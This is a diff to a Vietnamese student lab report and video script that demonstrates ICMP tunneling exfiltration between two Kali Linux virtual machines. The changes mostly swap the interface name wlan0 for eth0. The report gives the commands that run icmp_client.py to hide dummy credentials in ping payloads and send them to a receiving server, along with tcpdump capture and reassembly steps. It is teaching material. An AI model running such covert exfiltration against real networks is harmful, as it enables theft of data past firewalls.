@@ -69,9 +69,9 @@ Hai file mã nguồn được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHo
 ---
 
 ### 2. File `icmp_server.py` (Máy chủ hứng và ghép dữ liệu)
-* **Chức năng**: Đóng vai máy chủ của hacker bên ngoài Internet, lắng nghe gói tin ICMP trên card mạng (`wlan0` hoặc mọi card mạng), bóc tách dữ liệu và tái hợp thành tài liệu ban đầu.
+* **Chức năng**: Đóng vai máy chủ của hacker bên ngoài Internet, lắng nghe gói tin ICMP trên card mạng (`eth0` hoặc mọi card mạng), bóc tách dữ liệu và tái hợp thành tài liệu ban đầu.
 * **Cú pháp thực thi linh hoạt**:
-  * Chạy trên 2 máy thật: `sudo python3 icmp_server.py [wlan0]`
+  * Chạy trên 2 máy thật: `sudo python3 icmp_server.py [eth0]`
   * Chạy trong namespace: `python3 icmp_server.py`
 * **Cơ chế hoạt động**:
   1. Sử dụng hàm `sniff()` của Scapy lọc riêng các gói Echo Request (`icmp and icmp[icmptype] == 8`).
@@ -89,8 +89,9 @@ Hai file mã nguồn được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHo
 ### PHƯƠNG ÁN 1: TRIỂN KHAI TRÊN 2 MÁY THẬT KALI LINUX (CÙNG KẾT NỐI WI-FI)
 
 #### Thiết lập ban đầu:
-* **Máy 1 (Client nội bộ / Attacker)**: IP Wi-Fi (ví dụ `192.168.1.50`), card `wlan0`.
-* **Máy 2 (Server hứng dữ liệu)**: IP Wi-Fi (ví dụ `192.168.1.100`), card `wlan0`.
+* **Mô hình:** 2 máy laptop vật lý khác nhau cùng chạy Kali Linux trên VMware Workstation ở chế độ **Bridged** kết nối cùng mạng Wi-Fi. Trong Kali Linux của VMware, card mạng kết nối hiển thị là **`eth0`** (hoặc `ens33`).
+* **Máy 1 (Client nội bộ / Attacker)**: IP máy ảo (ví dụ `192.168.1.50`), kiểm tra bằng `hostname -I` hoặc `ip -br a`, card mạng `eth0`.
+* **Máy 2 (Server hứng dữ liệu)**: IP máy ảo (ví dụ `192.168.1.100`), kiểm tra bằng `hostname -I` hoặc `ip -br a`, card mạng `eth0`.
 
 ---
 
@@ -124,14 +125,14 @@ Hai file mã nguồn được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHo
 #### PHA 2: Soi gói tin ICMP xuyên tường lửa bằng `tcpdump` (Inspection Phase)
 
 1. **Tại Máy 2 (Server)**:
-   * Chạy công cụ `tcpdump` ở chế độ in mã chữ ASCII (`-A`):
+   * Chạy công cụ `tcpdump` ở chế độ in mã chữ ASCII (`-A`) trên card `eth0`:
      ```bash
-     sudo tcpdump -i wlan0 -nn -A 'icmp and icmp[icmptype] == 8'
+     sudo tcpdump -i eth0 -nn -A 'icmp and icmp[icmptype] == 8'
      ```
 2. **Tại Máy 1 (Client)**:
    * Chạy script tuồn dữ liệu:
      ```bash
-     sudo python3 icmp_client.py 192.168.1.100 wlan0
+     sudo python3 icmp_client.py 192.168.1.100 eth0
      ```
 3. **Hiện tượng quan sát được:**
    * Trên Máy 2, `tcpdump` tóm được từng gói tin ICMP đi xuyên qua tường lửa và hiển thị rõ từng đoạn chữ trong tài liệu mật nằm trần trụi trong phần ruột của gói tin (`CONFIDENTIAL-DATA: User=...`).
@@ -144,12 +145,12 @@ Hai file mã nguồn được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHo
 1. **Tại Máy 2 (Server)**:
    * Nhấn `Ctrl + C` dừng `tcpdump`, sau đó khởi động máy chủ ICMP Tunnel:
      ```bash
-     sudo python3 icmp_server.py wlan0
+     sudo python3 icmp_server.py eth0
      ```
 2. **Tại Máy 1 (Client)**:
    * Chạy lại script tuồn dữ liệu:
      ```bash
-     sudo python3 icmp_client.py 192.168.1.100 wlan0
+     sudo python3 icmp_client.py 192.168.1.100 eth0
      ```
 3. **Kết quả mỹ mãn trên cả 2 máy thật:**
    * **Máy 1 (Client):** Báo gửi thành công từng mảnh #01, #02, #03 và gửi tín hiệu `__EOF__`.
@@ -213,25 +214,27 @@ Báo cáo cung cấp **2 phương án kịch bản tương ứng**:
 ### KỊCH BẢN A: DÀNH CHO QUAY VIDEO TRÊN 2 MÁY THẬT (QUA MẠNG WI-FI)
 
 > **Bố cục đề xuất khi quay video:**
-> * **Máy 1 (Bên trái):** Kali Linux - Máy Client nội bộ / Attacker (IP ví dụ: `192.168.1.50`, card `wlan0`).
-> * **Máy 2 (Bên phải):** Kali Linux - Máy Server bên ngoài hứng dữ liệu (IP ví dụ: `192.168.1.100`, card `wlan0`).
+> * **Máy 1 (Bên trái):** Kali Linux trên VMware Bridged - Máy Client nội bộ / Attacker (IP ví dụ: `192.168.1.50`, card `eth0`).
+> * **Máy 2 (Bên phải):** Kali Linux trên VMware Bridged - Máy Server bên ngoài hứng dữ liệu (IP ví dụ: `192.168.1.100`, card `eth0`).
 > * *Nguyên tắc:* Gõ lệnh tới đâu, giải thích ngay chức năng và ý nghĩa kỹ thuật tới đó.
 
 #### [0:00 - 0:35] Mở đầu & Giới thiệu đề tài
 * **Lời thoại:**
-  *"Kính chào thầy và các bạn! Hôm nay nhóm em xin trình bày bài thực hành số 03: Kỹ thuật tấn công Kênh truyền ngầm ICMP Tunneling để đánh cắp và tuồn dữ liệu bí mật (Data Exfiltration) được triển khai trực tiếp trên 2 máy tính vật lý Kali Linux cùng kết nối mạng Wi-Fi. Trong thực tế doanh nghiệp, tường lửa thường chặn cứng các cổng TCP ra ngoài để ngăn nhân viên tải file, nhưng lại mở giao thức ping ICMP để kiểm tra mạng. Kẻ tấn công lợi dụng điểm mù này để giấu dữ liệu mật vào phần payload của gói ping, biến ICMP thành một đường hầm buôn lậu dữ liệu xuyên thủng tường lửa!"*
+  *"Kính chào thầy và các bạn! Hôm nay nhóm em xin trình bày bài thực hành số 03: Kỹ thuật tấn công Kênh truyền ngầm ICMP Tunneling để đánh cắp và tuồn dữ liệu bí mật (Data Exfiltration) được triển khai trực tiếp trên 2 máy tính vật lý Kali Linux chạy VMware chế độ Bridged cùng kết nối chung mạng Wi-Fi. Trong thực tế doanh nghiệp, tường lửa thường chặn cứng các cổng TCP ra ngoài để ngăn nhân viên tải file, nhưng lại mở giao thức ping ICMP để kiểm tra mạng. Kẻ tấn công lợi dụng điểm mù này để giấu dữ liệu mật vào phần payload của gói ping, biến ICMP thành một đường hầm buôn lậu dữ liệu xuyên thủng tường lửa!"*
 
 #### [0:35 - 1:15] Bước 1: Kiểm tra IP và thông tuyến Wi-Fi giữa 2 máy
 * **Thao tác 1 (Trên Máy 2 - Kiểm tra IP):**
   ```bash
-  ip -br addr show wlan0
+  hostname -I
+  # Hoặc xem bảng chi tiết card mạng:
+  ip -br addr
   ```
   * **Lời thoại:**
-    *"Trước tiên, trên Máy 2 bên phải, em kiểm tra địa chỉ IP card Wi-Fi `wlan0` là `192.168.1.100`. Đây sẽ là máy chủ tiếp nhận dữ liệu bí mật."*
+    *"Trước tiên, trên Máy 2 bên phải, em kiểm tra địa chỉ IP bằng lệnh `hostname -I` (hoặc `ip -br addr`). Do chạy trên VMware Bridged, card mạng của máy là `eth0` và có IP là `192.168.1.100`. Đây sẽ là máy chủ tiếp nhận dữ liệu bí mật."*
 
 * **Thao tác 2 (Trên Máy 1 - Kiểm tra IP & Ping sang Máy 2):**
   ```bash
-  ip -br addr show wlan0
+  hostname -I
   ping -c 2 192.168.1.100
   ```
   * **Lời thoại:**
@@ -258,31 +261,31 @@ Báo cáo cung cấp **2 phương án kịch bản tương ứng**:
 #### [2:10 - 3:00] Bước 3: Pha 2 — Bật tcpdump soi dữ liệu mật trong gói ping
 * **Thao tác 1 (Trên Máy 2 - Chạy tcpdump chế độ in mã chữ ASCII):**
   ```bash
-  sudo tcpdump -i wlan0 -nn -A 'icmp and icmp[icmptype] == 8'
+  sudo tcpdump -i eth0 -nn -A 'icmp and icmp[icmptype] == 8'
   ```
   * **Lời thoại:**
-    *"Ở Pha 2, trên Máy 2 em bật `tcpdump` trên card `wlan0` với cờ `-A` để soi sâu vào phần nội dung văn bản ASCII của tất cả các gói Echo Request nhận được."*
+    *"Ở Pha 2, trên Máy 2 em bật `tcpdump` trên card `eth0` với cờ `-A` để soi sâu vào phần nội dung văn bản ASCII của tất cả các gói Echo Request nhận được."*
 
 * **Thao tác 2 (Trên Máy 1 - Chạy client tuồn dữ liệu):**
   ```bash
-  sudo python3 icmp_client.py 192.168.1.100 wlan0
+  sudo python3 icmp_client.py 192.168.1.100 eth0
   ```
   * **Lời thoại:**
-    *"Tại Máy 1, em chạy `icmp_client.py 192.168.1.100 wlan0`. Script này băm nhỏ chuỗi thông tin mật gồm tài khoản, mật khẩu quản trị và mã token thành từng mảnh 24 bytes, rồi nhồi vào ruột của gói ping.
+    *"Tại Máy 1, em chạy `icmp_client.py 192.168.1.100 eth0`. Script này băm nhỏ chuỗi thông tin mật gồm tài khoản, mật khẩu quản trị và mã token thành từng mảnh 24 bytes, rồi nhồi vào ruột của gói ping.
     
     *Thầy và các bạn hãy nhìn sang Máy 2: Màn hình tcpdump hiện rõ mồn một chuỗi ký tự `CONFIDENTIAL-DATA: User=admin Pass=SecretPassword123 Token=JWT-XYZ-999` nằm phơi bày trong payload của gói ping! Dữ liệu mật đã vượt qua tường lửa công ty ra ngoài trót lọt!"*
 
 #### [3:00 - 4:00] Bước 4: Pha 3 — Máy chủ ICMP Server tự động Tái hợp dữ liệu
 * **Thao tác 1 (Trên Máy 2 - Nhấn Ctrl+C dừng tcpdump, bật ICMP Server):**
   ```bash
-  sudo python3 icmp_server.py wlan0
+  sudo python3 icmp_server.py eth0
   ```
   * **Lời thoại:**
-    *"Ở Pha 3, trên Máy 2 em khởi động máy chủ kênh ngầm `icmp_server.py wlan0`. Chương trình này sử dụng thư viện Scapy mở raw socket, túc trực bắt từng mảnh dữ liệu ICMP và gom vào bộ đệm."*
+    *"Ở Pha 3, trên Máy 2 em khởi động máy chủ kênh ngầm `icmp_server.py eth0`. Chương trình này sử dụng thư viện Scapy mở raw socket, túc trực bắt từng mảnh dữ liệu ICMP và gom vào bộ đệm."*
 
 * **Thao tác 2 (Trên Máy 1 - Gửi lại dữ liệu từ client):**
   ```bash
-  sudo python3 icmp_client.py 192.168.1.100 wlan0
+  sudo python3 icmp_client.py 192.168.1.100 eth0
   ```
   * **Lời thoại:**
     *"Từ Máy 1, em thực thi truyền dữ liệu lại. Nhìn sang Máy 2 bên phải: Server nhận tuần tự mảnh 1, mảnh 2, mảnh 3, và khi nhận được tín hiệu kết thúc `__EOF__`, Server lập tức in ra khung thông báo: `[+] DA NHAN DU TOAN BO CAC MANH! TIEN HANH GHEP DU LIEU HOAN CHINH` với toàn bộ 71 bytes tài liệu mật được khôi phục nguyên vẹn 100%!"*
